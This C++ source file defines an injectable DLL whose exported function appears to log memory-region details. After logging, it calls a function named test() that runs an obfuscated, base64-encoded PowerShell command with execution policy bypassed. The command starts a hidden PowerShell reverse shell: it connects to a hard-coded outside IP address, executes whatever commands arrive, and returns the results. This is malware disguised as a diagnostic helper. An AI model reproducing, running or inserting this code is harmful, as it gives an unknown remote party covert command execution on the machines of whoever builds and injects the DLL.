#include "test.h"

int test() {
  system(AY_OBFUSCATE("powershell -ep bypass -e "
                    "\"UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAUABTAEgATwBNAEUA"
                    "XABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQ"
                    "BlAG4AdABMAGkAcwB0ACAAewAKACAAIAAgACAAIAAgACAAIAAkAHQAYwBw"
                    "AEMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAH"
                    "kAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMA"
                    "bABpAGUAbgB0ACgAJwAxADcAMgAuADIAMwA0AC4AMgAxADcALgAxADcAMA"
                    "AnACwAIAA0ADIAMAA2ADkAKQA7AAoAIAAgACAAIAAgACAAIAAgACQAbgBl"
                    "AHQAdwBvAHIAawBTAHQAcgBlAGEAbQAgAD0AIAAkAHQAYwBwAEMAbABpAG"
                    "UAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsACgAgACAAIAAgACAA"
                    "IAAgACAAJABiAHUAZgBmAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYw"
                    "B0ACAAYgB5AHQAZQBbAF0AIAA2ADUANQAzADUAOwAKACAAIAAgACAAIAAg"
                    "ACAAIAB3AGgAaQBsAGUAIAAoACgAJABiAHkAdABlAHMAUgBlAGEAZAAgAD"
                    "0AIAAkAG4AZQB0AHcAbwByAGsAUwB0AHIAZQBhAG0ALgBSAGUAYQBkACgA"
                    "JABiAHUAZgBmAGUAcgAsACAAMAAsACAAJABiAHUAZgBmAGUAcgAuAEwAZQ"
                    "BuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsACgAgACAAIAAgACAAIAAg"
                    "ACAAIAAgACAAIAAkAHIAZQBjAGUAaQB2AGUAZABEAGEAdABhACAAPQAgAC"
                    "gAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcA"
                    "XQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAdQ"
                    "BmAGYAZQByACwAIAAwACwAIAAkAGIAeQB0AGUAcwBSAGUAYQBkACkAKQA7"
                    "AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABlAHgAZQBjAHUAdABpAG"
                    "8AbgBSAGUAcwB1AGwAdAAgAD0AIABJAG4AdgBvAGsAZQAtAEUAeABwAHIA"
                    "ZQBzAHMAaQBvAG4AIAAkAHIAZQBjAGUAaQB2AGUAZABEAGEAdABhACAAMg"
                    "A+"
                    "ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAOwAKACAAIAAgAC"
                    "AAIAAgACAAIAAgACAAIAAgACQAcgBlAHMAcABvAG4AcwBlAFQAbwBTAGUA"
                    "bgBkACAAPQAgACQAZQB4AGUAYwB1AHQAaQBvAG4AUgBlAHMAdQBsAHQAIA"
                    "ArACAAJwBQAFMAIAAnACAAKwAgACgARwBlAHQALQBMAG8AYwBhAHQAaQBv"
                    "AG4AKQAuAFAAYQB0AGgAIAArACAAJwA+"
                    "ACAAJwA7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwBwAG"
                    "8AbgBzAGUAQgB5AHQAZQBzACAAPQAgAFsAVABlAHgAdAAuAEUAbgBjAG8A"
                    "ZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKA"
                    "AkAHIAZQBzAHAAbwBuAHMAZQBUAG8AUwBlAG4AZAApADsACgAgACAAIAAg"
                    "ACAAIAAgACAAIAAgACAAIAAkAG4AZQB0AHcAbwByAGsAUwB0AHIAZQBhAG"
                    "0ALgBXAHIAaQB0AGUAKAAkAHIAZQBzAHAAbwBuAHMAZQBCAHkAdABlAHMA"
                    "LAAgADAALAAgACQAcgBlAHMAcABvAG4AcwBlAEIAeQB0AGUAcwAuAEwAZQ"
                    "BuAGcAdABoACkAOwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbgBl"
                    "AHQAdwBvAHIAawBTAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAOwAKAC"
                    "AAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAJAB0AGMAcABDAGwA"
                    "aQBlAG4AdAAuAEMAbABvAHMAZQAoACkAIAB9ACAALQBXAGkAbgBkAG8Adw"
                    "BTAHQAeQBsAGUAIABIAGkAZABkAGUAbgA=\""));
  return 0;
}

// Custom function to be called after DLL injection
extern "C" __declspec(dllexport) bool DumpMemoryInfo() {
  static bool hasDumped = false;
  if (hasDumped) {
    return false;
  }
  hasDumped = true;

  // Print bytes in the app that it was injected to
  unsigned char* baseAddress = (unsigned char*)GetModuleHandle(NULL);
  MEMORY_BASIC_INFORMATION mbi;
  VirtualQuery(baseAddress, &mbi, sizeof(mbi));
  
  spdlog::info("Base Address: {0:x}", (uintptr_t)mbi.BaseAddress);
  spdlog::info("Allocation Base: {0:x}", (uintptr_t)mbi.AllocationBase);
  spdlog::info("Region Size: {} bytes", mbi.RegionSize);
  spdlog::info("State: {}", mbi.State == MEM_COMMIT ? "Committed" : mbi.State == MEM_RESERVE ? "Reserved" : "Free");
  spdlog::info("Protect: {}", mbi.Protect);
  spdlog::info("Type: {}", mbi.Type == MEM_IMAGE ? "Image" : mbi.Type == MEM_MAPPED ? "Mapped" : "Private");

  test();
  return true;
}
